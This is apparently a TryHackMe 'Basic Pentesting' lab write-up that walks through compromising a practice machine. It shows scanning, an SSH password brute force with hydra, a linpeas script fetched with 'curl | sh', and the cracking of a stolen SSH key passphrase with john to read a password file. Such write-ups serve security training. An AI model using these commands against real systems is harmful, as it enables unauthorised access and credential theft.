# Basic Pentesting TryHackMe
### [Lab link](https://tryhackme.com/r/room/basicpentestingjt)

In this lab we will be breaking into this machine and finding the password using basic tools and Linux. 

## Tasks


#### 1. First things first: we deploy the machine and connect to the THM network via OpenVPN and make sure we can communicate using the ping command.
``` 
ping 10.10.193.213 -c 4

PING 10.10.193.213 (10.10.193.213) 56(84) bytes of data.

64 bytes from 10.10.193.213: icmp_seq=1 ttl=61 time=91.1 ms
64 bytes from 10.10.193.213: icmp_seq=2 ttl=61 time=103 ms
64 bytes from 10.10.193.213: icmp_seq=3 ttl=61 time=97.1 ms
64 bytes from 10.10.193.213: icmp_seq=4 ttl=61 time=173 ms

--- 10.10.193.213 ping statistics ---

4 packets transmitted, 4 received, 0% packet loss, time 5010ms

rtt min/avg/max/mdev = 91.079/108.496/172.565/28.882 ms
```

#### 2. Start a basic recon by running nmap on the target IP to find open ports and services: 

`nmap -sC -sV -oN nmap/basic/basic.txt 10.10.193.213`


Using this command, the scan is outputted to basic.txt: 

[INSERT IMG]

As you can see the following ports are open: 

- 22
- **80 (Apache 2.4.18)**  > -- what we’re focused on
- 139
- 445
- 8009
- 8080


#### 3. To find the hidden directories, I used the dirsearch tool to find hidden directories using the rockyou wordlist:
```
dirsearch -u 10.10.193.213 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )                                                                                
                                                                                                       
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 220545

Output File: /home/kali/reports/_10.10.193.213/_24-04-16_15-37-13.txt

Target: http://10.10.193.213/

[15:37:13] Starting:                                                                                   
[15:37:19] 301 -  320B  - /development  ->  http://10.10.193.213/development/
[15:48:00] 403 -  301B  - /server-status                                    
                                                                              
Task Completed                           
```
As you can see the hidden directory is /development

[INSERT IMG]


#### 4. Before we explore those files, lets get a linux enumeration running on the web server using enum4linux and have a look at the possible usernames and other info: 

```enum4linux -a 10.10.52.25 > basicenum.txt```

While that runs we can check out some of the text notes left in the /development directory…

dev.txt:
```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm
using version 2.5.12, because other versions were giving me trouble. -K
2018-04-22: SMB has been configured. -K
2018-04-21: I got Apache set up. Will put in our content later. -J
```
j.txt:
```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```
> From this info we can assume that we are looking for a “k” and “j” as possible usernames to look for. 
> This context also explains the Apache version in the scan that we found and the SMB port also being open (port 445)

Let’s check back into our scan: 
```
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
```
> We find that there are two users named jan and kay.

#### 5. The username is jan

#### 6. Now we can bust out hydra to start bruteforcing this password for jan using SSH and the rockyou wordlist: 

`hydra -l jan -P /usr/share/wordlists/SecLists/Passwords/rockyou.txt ssh://10.10.52.25`

```
[22][ssh] host: 10.10.68.148   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
```
As you can see we’ve successfully cracked the password which is **armando**


#### 7. Now that we’ve got the password we can login via SSH by typing: 
```
ssh jan@10.10.52.25
password: armando
```
We got in!

#### 8. For privilege escalation and system enumeration I’ve used LINPEAS due to its color coding output it gives for better reading. We can get it from this command: 

`curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`

> Make it an executable then run linpeas.sh and output it to a file: 
`./linpeas.sh -a > linlog.txt`

After running we’ve found some vulnerable file paths we can utilize:
```
[+] Files inside others home (limit 20)
/home/kay/.profile                                                                                 
/home/kay/.viminfo
/home/kay/.bashrc
/home/kay/.bash_history
/home/kay/.lesshst
/home/kay/.ssh/authorized_keys
/home/kay/.ssh/id_rsa
/home/kay/.ssh/id_rsa.pub
/home/kay/.bash_logout
/home/kay/.sudo_as_admin_successful
/home/kay/pass.bak
```
We can see that the rsa keys and the pass.bak files are in kay’s folder path but unfortunately we don’t have access to view as jan.

#### 9. Upon looking in kay’s directory we can see that she has an ssh key that we can access 
```
jan@basic2:/home/kay$ ls -la
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
jan@basic2:/home/kay$ cd .ssh
jan@basic2:/home/kay/.ssh$ ls -la
total 20
drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
```
Viewed the key, copied the text and pasting it into my own file kayrsa.txt to login via ssh key, but failed due to the key needing a passphrase:
```
Enter passphrase for key 'kayrsa.txt': 
kay@10.10.52.25's password: 
Permission denied, please try again.
```
No worries, from this we can use JohnTheRipper a tool used to crack the passphrase: 
```
kali@kali)-[~]
└─$ /usr/share/john/ssh2john.py kayrsa.txt > crack
```
Run john on the file to output to another file called crack or whatever you want. Then use a wordlist like rockyou to crack it open!
```
kali@kali: john crack --wordlist=/usr/share/wordlists/rockyou.txt
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (kayrsa.txt)     
1g 0:00:00:00 DONE (2024-04-16 18:15) 8.333g/s 689466p/s 689466c/s 689466C/s behlat..bball40
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

We’ve found the passphrase (beeswax)! Now we can finally log on to kay.

From here  we can obtain the final password: 
ssh -i kayrsa.txt kay@10.10.52.25                  
Enter passphrase for key 'kayrsa.txt': 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Mon Apr 23 16:04:07 2018 from 192.168.56.102
kay@basic2:~$ ls
pass.bak
kay@basic2:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```
10. I’ve obtained the final password: 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$

Room challenge complete.
